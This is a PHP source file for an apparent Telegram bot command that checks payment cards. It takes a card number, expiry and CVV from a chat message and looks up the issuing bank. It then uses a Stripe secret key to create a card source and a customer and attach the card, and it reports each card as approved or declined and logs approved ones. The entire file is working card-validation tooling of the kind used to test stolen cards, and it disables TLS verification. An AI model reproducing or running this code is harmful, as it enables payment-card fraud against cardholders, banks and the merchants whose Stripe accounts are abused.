<?php
include ('config.php');
$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
          $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Host: lookup.binlist.net',
          'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $fim = curl_exec($ch);
          $bank = GetStr($fim, '"bank":{"name":"', '"');
          $name = GetStr($fim, '"name":"', '"');
          $brand = GetStr($fim, '"brand":"', '"');
          $country = GetStr($fim, '"country":{"name":"', '"');
          $emoji = GetStr($fim, '"emoji":"', '"');
          $scheme = GetStr($fim, '"scheme":"', '"');
          $type = GetStr($fim, '"type":"', '"');
          if(strpos($fim, '"type":"credit"') !== false){
          $bin = 'Credit';
          }else{
          $bin = 'Debit';
          };
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
          $result1 = curl_exec($ch);
          $tok1 = Getstr($result1,'"id": "','"');
          $msg1 = Getstr($result1,'"message": "','"');
          $msg1a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result1, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "testmode_charges_only")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_year'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'invalid_expiry_month'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if ((strpos($result3, 'incorrect_number'))){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
          $result2 = curl_exec($ch);
          $tok2 = Getstr($result2,'"id": "','"');
          $msg2 = Getstr($result2,'"message": "','"');
          $msg2a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result2, "card_error")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "card_declined")){
            sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Respone 2 -» $msg2a </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result2, "invalid_account")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» CALL ISUSSER  </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "invalid_cvc")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "sources_required_type_param")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$tok2.'/sources/'.$tok1.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $result3 = curl_exec($ch);
          $msg3 = Getstr($result3,'"message": "','"');
          $msg3a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result3, '"cvc_check": "pass"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          sendLog($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if(strpos($result3, '"id"' )) {
            sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
            }
          if(strpos($result3, '"cvc_check": "fail"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» YOUR CARD WAS DECLINED BY ISUSING BANK ❌</b>\n<b>Gateway -» Stripe CCN auth v2.1</b>%0<b>Respone 2 -» $msg3a </b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
          return;
          }
          if (strpos($result3, "rate_limit")){
            sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe CCN auth v2.1</b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          } else {
            sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
            sendLog($chatId, "<b>BUG REPORTED /aut</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
            }


?>